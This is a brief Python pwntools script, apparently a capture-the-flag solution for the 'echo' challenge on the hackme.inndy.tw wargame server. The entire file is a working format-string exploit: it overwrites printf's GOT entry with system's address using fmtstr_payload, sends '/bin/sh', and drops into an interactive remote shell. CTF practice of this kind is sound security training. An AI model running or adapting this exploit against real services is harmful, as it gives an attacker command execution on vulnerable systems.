from pwn import *

context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
target = remote('hackme.inndy.tw', 7711)
elf = ELF('./echo')
plt_sys = elf.symbols['system']
got_printf = elf.got['printf']
payload = fmtstr_payload(7,{got_printf:plt_sys})
print payload
target.sendline(payload)
target.recvuntil('\n')
target.sendline('/bin/sh\x00')
target.interactive()